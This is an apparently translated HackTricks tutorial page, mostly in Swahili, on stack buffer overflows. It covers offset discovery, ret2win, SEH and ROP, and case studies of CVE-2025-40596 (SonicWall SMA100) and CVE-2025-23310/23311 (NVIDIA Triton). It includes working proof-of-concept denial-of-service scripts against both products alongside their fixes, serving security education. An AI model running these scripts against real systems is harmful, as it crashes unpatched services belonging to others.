# Stack Overflow

{{#include ../../banners/hacktricks-training.md}}

## Stack Overflow ni nini

A **stack overflow** ni udhaifu unaotokea wakati programu inaandika data zaidi kwenye stack kuliko iliyopewa kuhifadhi. Data ziizozidi zitabadilisha **nafasi ya kumbukumbu iliyo karibu (overwrite adjacent memory space)**, na kusababisha uharibifu wa data halali, kuingiliwa kwa mtiririko wa udhibiti, na uwezekano wa kutekelezwa kwa msimbo wa uharibifu. Tatizo hili mara nyingi hutokana na matumizi ya functions zisizo salama ambazo hazifanyi ukaguzi wa mipaka kwenye input.

Shida kuu ya kufunika hii ni kwamba **saved instruction pointer (EIP/RIP)** na **saved base pointer (EBP/RBP)** za kurudi kwenye function iliyopita **zimehifadhiwa kwenye stack**. Kwa hivyo, mshambuliaji ataweza kuzifunika na **kudhibiti mtiririko wa utekelezaji wa programu**.

Udhaifu huu kawaida hutokea kwa sababu function **inakopa ndani ya stack bytes zaidi kuliko kiasi kilichotengwa kwa ajili yake**, hivyo kuweza kufunika sehemu nyingine za stack.

Baadhi ya functions za kawaida zilizo hatarini kwa hili ni: **`strcpy`, `strcat`, `sprintf`, `gets`**... Pia, functions kama **`fgets`**, **`read`** & **`memcpy`** ambazo zinachukua **kigezo cha urefu (length argument)**, zinaweza kutumika kwa njia hatarishi ikiwa urefu uliobainishwa ni mkubwa kuliko ule uliotengwa.
```c
void vulnerable() {
char buffer[128];
printf("Enter some text: ");
gets(buffer); // This is where the vulnerability lies
printf("You entered: %s\n", buffer);
}
```
### Kupata Stack Overflows offsets

Njia ya kawaida zaidi ya kupata stack overflows ni kutoa input kubwa sana ya `A`s (e.g. `python3 -c 'print("A"*1000)'`) na kutegemea `Segmentation Fault` inayoonyesha kwamba **anwani `0x41414141` ilijaribu kufikiwa**.

Zaidi ya hayo, mara baada ya kugundua kuwa kuna udhaifu wa Stack Overflow, utahitaji kupata offset hadi iwezekane **kuandika upya return address**; kwa hili kawaida hutumika **De Bruijn sequence.** Kwa alfabeti yenye ukubwa _k_ na subsequences za urefu _n_, ni **mfululizo wa mviringo ambapo kila subsequence inayowezekana ya urefu _n_ inaonekana mara moja tu** kama subsequence zilizo mfululizo.

Kwa njia hii, badala ya kujaribu kwa mkono kugundua offset inayohitajika kudhibiti EIP, inawezekana kutumia mojawapo ya mfululizo huu kama padding kisha kutafuta offset ya bytes ambazo ziliendelea kuandika juu yake.

Inawezekana kutumia **pwntools** kwa hili:
```python
from pwn import *

# Generate a De Bruijn sequence of length 1000 with an alphabet size of 256 (byte values)
pattern = cyclic(1000)

# This is an example value that you'd have found in the EIP/IP register upon crash
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)  # Finds the offset of the sequence in the De Bruijn pattern
print(f"The offset is: {offset}")
```
au **GEF**:
```bash
#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```
## Kutumia Stack Overflows

During an overflow (supposing the overflow size if big enough) you will be able to **kuandika juu** values of local variables inside the stack until reaching the saved **EBP/RBP and EIP/RIP (or even more)**.\
Njia ya kawaida ya kutumia aina hii ya udhaifu ni kwa **kubadilisha return address** ili wakati function itakapomalizika **control flow itapelekwa mahali popote mtumiaji alibainisha** kwenye pointer hii.

Hata hivyo, katika nyakati nyingine labda tu **kuandika juu baadhi ya thamani za vigezo kwenye stack** inaweza kutosha kwa exploitation (kama katika changamoto rahisi za CTF).

### Ret2win

In this type of CTF challenges, there is a **function** **inside** the binary that is **never called** and that **you need to call in order to win**. Kwa changamoto hizi unahitaji tu kupata **offset ya kuandika juu return address** na **kupata address ya function** ya kuitwa (kawaida [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) itakuwa imezimwa) ili wakati function iliyo na udhaifu inaporudi, function iliyofichwa itaitwa:


{{#ref}}
ret2win/
{{#endref}}

### Stack Shellcode

Kwenye senario hii mshambuliaji anaweza kuweka shellcode kwenye stack na kutumia EIP/RIP iliyodhibitiwa kuruka kwenye shellcode na kutekeleza msimbo yoyote:


{{#ref}}
stack-shellcode/
{{#endref}}

### Windows SEH-based exploitation (nSEH/SEH)

On 32-bit Windows, an overflow may overwrite the Structured Exception Handler (SEH) chain instead of the saved return address. Exploitation typically replaces the SEH pointer with a POP POP RET gadget and uses the 4-byte nSEH field for a short jump to pivot back into the large buffer where shellcode lives. Mfano wa kawaida ni short jmp katika nSEH inayomwaga kwenye 5-byte near jmp iliyowekwa kabla kabisa ya nSEH kuruka mamia ya bytes nyuma kwenye mwanzo wa payload.


{{#ref}}
windows-seh-overflow.md
{{#endref}}

### ROP & Ret2... techniques

Mbinu hii ni mfumo wa msingi wa kukwepa ulinzi mkuu wa mbinu iliyotangulia: **No executable stack (NX)**. Na inaruhusu kutekeleza mbinu nyingine kadhaa (ret2lib, ret2syscall...) ambazo zitaisha zikifanya maagizo yoyote kwa kutumia maagizo yaliyopo ndani ya binary:


{{#ref}}
../rop-return-oriented-programing/
{{#endref}}

## Heap Overflows

An overflow is not always going to be in the stack, it could also be in the **heap** for example:


{{#ref}}
../libc-heap/heap-overflow.md
{{#endref}}

## Aina za ulinzi

There are several protections trying to prevent the exploitation of vulnerabilities, check them in:


{{#ref}}
../common-binary-protections-and-bypasses/
{{#endref}}

### Real-World Example: CVE-2025-40596 (SonicWall SMA100)

Uonyesho mzuri wa kwanini **`sscanf` haipaswi kamwe kuaminiwa kwa kuchakata input isiyothibitishwa** ulitokea mwaka 2025 katika kifaa cha SonicWall SMA100 SSL-VPN.
Routi iliyo na udhaifu ndani ya `/usr/src/EasyAccess/bin/httpd` inajaribu kutoa version na endpoint kutoka URI yoyote inayoanza na `/__api__/`:
```c
char version[3];
char endpoint[0x800] = {0};
/* simplified proto-type */
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
```
1. Uongofu wa kwanza (`%2s`) huhifadhi kwa usalama **baiti mbili** ndani ya `version` (mfano `"v1"`).
2. Uongofu wa pili (`%s`) **hauna kipimo cha urefu**, kwa hivyo `sscanf` itaendelea kunakili **hadi baiti ya kwanza ya NUL**.
3. Kwa sababu `endpoint` iko kwenye **stack** na ni **0x800 bytes long**, kutoa path ndefu kuliko 0x800 bytes kunaharibu kila kitu kilicho baada ya buffer ‑ ikiwa ni pamoja na **stack canary** na **saved return address**.

Mfano wa proof-of-concept wa mstari mmoja unatosha kusababisha crash **kabla ya authentication**:
```python
import requests, warnings
warnings.filterwarnings('ignore')
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
```
Even though stack canaries abort the process, an attacker still gains a **Denial-of-Service** primitive (and, with additional information leaks, possibly code-execution).  The lesson is simple:

* Daima toa **upana wa uwanja wa juu kabisa** (kwa mfano `%511s`).
* Pendelea mbadala salama kama `snprintf`/`strncpy_s`.

### Mfano halisi: CVE-2025-23310 & CVE-2025-23311 (NVIDIA Triton Inference Server)

NVIDIA’s Triton Inference Server (≤ v25.06) ilikuwa na **stack-based overflows** nyingi zinazofikika kupitia HTTP API yake.
Muundo hatarishi ulijirudia katika `http_server.cc` na `sagemaker_server.cc`:
```c
int n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);
if (n > 0) {
/* allocates 16 * n bytes on the stack */
struct evbuffer_iovec *v = (struct evbuffer_iovec *)
alloca(sizeof(struct evbuffer_iovec) * n);
...
}
```
1. `evbuffer_peek` (libevent) hurudisha **idadi ya sehemu za buffer za ndani** ambazo zinaunda mwili wa ombi la HTTP wa sasa.
2. Kila sehemu husababisha `evbuffer_iovec` ya **16-byte** kupewa nafasi kwenye **stack** kupitia `alloca()` – **bila kikomo cha juu**.
3. Kwa kutumia vibaya **HTTP _chunked transfer-encoding_**, mteja anaweza kulazimisha ombi kugawanywa kuwa **mamia ya maelfu ya vipande vya 6-byte** (`"1\r\nA\r\n"`). Hii inafanya `n` ikue bila kikomo hadi **stack** itakapomalizika.

#### Uthibitisho wa Dhana (DoS)
```python
#!/usr/bin/env python3
import socket, sys

def exploit(host="localhost", port=8000, chunks=523_800):
s = socket.create_connection((host, port))
s.sendall((
f"POST /v2/models/add_sub/infer HTTP/1.1\r\n"
f"Host: {host}:{port}\r\n"
"Content-Type: application/octet-stream\r\n"
"Inference-Header-Content-Length: 0\r\n"
"Transfer-Encoding: chunked\r\n"
"Connection: close\r\n\r\n"
).encode())

for _ in range(chunks):                  # 6-byte chunk ➜ 16-byte alloc
s.send(b"1\r\nA\r\n")            # amplification factor ≈ 2.6x
s.sendall(b"0\r\n\r\n")               # end of chunks
s.close()

if __name__ == "__main__":
exploit(*sys.argv[1:])
```
Ombi la takriban ~3 MB linatosha kuandika upya anwani ya kurudi iliyohifadhiwa na **crash** daemon kwenye default build.

#### Patch & Mitigation
Toleo la 25.07 linabadilisha unsafe stack allocation kuwa **heap-backed `std::vector`** na linashughulikia `std::bad_alloc` kwa heshima:
```c++
std::vector<evbuffer_iovec> v_vec;
try {
v_vec = std::vector<evbuffer_iovec>(n);
} catch (const std::bad_alloc &e) {
return TRITONSERVER_ErrorNew(TRITONSERVER_ERROR_INVALID_ARG, "alloc failed");
}
struct evbuffer_iovec *v = v_vec.data();
```
Mafunzo yaliyopatikana:
* Kamwe usiite `alloca()` ukiwa na ukubwa unaodhibitiwa na mshambulizi.
* Chunked requests zinaweza kubadilisha kwa kiasi kikubwa muundo wa buffers za upande wa server.
* Thibitisha / weka kikomo thamani yoyote inayotokana na maingizo ya mteja *kabla* ya kuitumia katika ugawaji wa kumbukumbu.

## References
* [watchTowr Labs – Stack Overflows, Heap Overflows and Existential Dread (SonicWall SMA100)](https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/)
* [Trail of Bits – Uncovering memory corruption in NVIDIA Triton](https://blog.trailofbits.com/2025/08/04/uncovering-memory-corruption-in-nvidia-triton-as-a-new-hire/)
* [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)

{{#include ../../banners/hacktricks-training.md}}
